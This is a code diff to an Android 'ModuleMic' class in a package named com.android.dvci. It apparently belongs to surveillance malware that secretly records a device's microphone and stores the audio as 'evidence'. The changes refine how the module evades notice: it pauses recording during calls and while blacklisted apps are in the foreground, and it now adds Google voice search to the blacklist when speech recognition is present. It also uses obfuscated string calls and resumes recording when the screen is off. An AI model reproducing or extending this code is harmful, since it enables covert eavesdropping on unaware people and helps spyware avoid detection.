@@ -9,7 +9,6 @@
 
 package com.android.dvci.module;
 
-import android.app.Activity;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
@@ -123,6 +122,12 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 	public synchronized void addBlacklist(String black) {
 		blacklist.add(black);
 	}
+	public synchronized void delBlacklist(String black) {
+		blacklist.remove(black);
+	}
+	public synchronized boolean inInBlacklist(String process) {
+		return blacklist.contains(process);
+	}
 
 	public static ModuleMic self() {
 		return (ModuleMic) ManagerModule.self().get(M.e("mic"));
@@ -214,6 +219,7 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 		}
 		removePhoneListener();
 		ListenerStandby.self().detach(standbyObserver);
+		standbyObserver=null;
 		specificStop();
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (ended)");//$NON-NLS-1$
@@ -232,7 +238,21 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 		if (Cfg.DEBUG) {
 			Check.requires(status == StateRun.STARTED, "inconsistent status"); //$NON-NLS-1$
 		}
-
+		if (android.os.Build.VERSION.SDK_INT > 20){
+			if(isSpeechRecognitionActivityPresented()) {
+				if (!inInBlacklist(M.e("googlequicksearchbox:search"))) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + "(resetBlacklist)voice Recognition present ADDING in blacklist");//$NON-NLS-1$
+					}
+					addBlacklist(M.e("googlequicksearchbox:search"));
+				}
+			}else if(inInBlacklist(M.e("googlequicksearchbox:search"))){
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(resetBlacklist)voice Recognition not present REMOVING from blacklist");//$NON-NLS-1$
+				}
+				delBlacklist(M.e("googlequicksearchbox:search"));
+			}
+		}
 		if (recorder == null) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (actualGo), recorder not ready");
@@ -266,7 +286,7 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "crisis!");//$NON-NLS-1$
 			}
-			suspend();
+			base_suspend();
 		}
 
 	}
@@ -307,12 +327,12 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (notifyProcess) blacklist started, " + b.processInfo);
 					}
-					suspend();
+					base_suspend();
 				} else {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (notifyProcess) blacklist stopped, " + b.processInfo);
 					}
-					resume();
+					base_resume();
 				}
 			}
 		}
@@ -459,16 +479,16 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 	public int notification(Call call) {
 		if (call.isOngoing()) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (notification): call incoming, suspend");//$NON-NLS-1$
+				Check.log(TAG + " (notification): call incoming, base_suspend");//$NON-NLS-1$
 			}
 			callOngoing = true;
-			suspend();
+			base_suspend();
 		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (notification): ");//$NON-NLS-1$
 			}
 			callOngoing = false;
-			resume();
+			base_resume();
 		}
 		return 1;
 	}
@@ -476,12 +496,15 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 	public int notification(Standby b) {
 		if (b.isScreenOff()) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (notification) standby, resume mic");
+				Check.log(TAG + " (notification) standby, base_resume mic");
 			}
-			resume();
+			base_resume();
 		} else {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (notification) unlocking, base_resume mic");
+			}
 			if (isForegroundBlacklist()) {
-				suspend();
+				base_suspend();
 			}
 		}
 		return 0;
@@ -500,27 +523,13 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 		return false;
 	}
 
-	@Override
-	public synchronized void suspend() {
-		if (!isSuspended()) {
-			super.suspend();
-			saveRecorderEvidence();
-			stopRecorder();
-			if (allowResume == false) {
-				removePhoneListener();
-				ListenerStandby.self().detach(standbyObserver);
-			}
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (suspended)");//$NON-NLS-1$
-			}
-		}
-	}
+
 
 	private boolean canRecordMic() {
 		if (!Status.crisisMic() && !callOngoing) {
 			if (isForegroundBlacklist() && ListenerStandby.isScreenOn()) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (canRecordMic) can't resume because of blacklist");
+					Check.log(TAG + " (canRecordMic) can't base_resume because of blacklist");
 				}
 				return false;
 			}
@@ -531,6 +540,9 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 				}
 				return false;
 			}
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (canRecordMic)yes we can rec");
+			}
 			return true;
 		}
 		if (Cfg.DEBUG) {
@@ -539,39 +551,57 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 		return false;
 	}
 
+	abstract void specificSuspend();
+	abstract void specificResume();
 	@Override
-	public synchronized void resume() {
-		if (isSuspended() && allowResume && canRecordMic()) {
-
+	public synchronized void base_resume() {
+		if (base_isSuspended() && allowResume && canRecordMic()) {
+			specificResume();
 			try {
 				specificStart();
-			} catch (final IllegalStateException e) {
-				if (Cfg.EXCEPTION) {
-					Check.log(e);
-				}
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (resume) Error: " + e);//$NON-NLS-1$
-				}
 			} catch (final Exception e) {
 				if (Cfg.EXCEPTION) {
 					Check.log(e);
 				}
 
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (resume) Error: " + e);//$NON-NLS-1$
+					Check.log(TAG + " (base_resume) Error: " + e);//$NON-NLS-1$
 				}
 			}
 
-			super.resume();
+			super.base_resume();
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (resumed)");//$NON-NLS-1$
+			}
+		}else{
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (base_resume): cannot base_resume : allowresume="+allowResume+" canRecord "+ canRecordMic() + " base_isSuspended=" + base_isSuspended());
+			}
+		}
+	}
+	@Override
+	public synchronized void base_suspend() {
+		if (!base_isSuspended()) {
+			super.base_suspend();
+			specificSuspend();
+			if (allowResume == false) {
+				removePhoneListener();
+				ListenerStandby.self().detach(standbyObserver);
+			}
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (suspended)");//$NON-NLS-1$
 			}
 		}
 	}
 
 	public void stop() {
 		allowResume = false;
-		suspend();
+		base_suspend();
+	}
+
+	@Override
+	public String getTag() {
+		return TAG;
 	}
 }
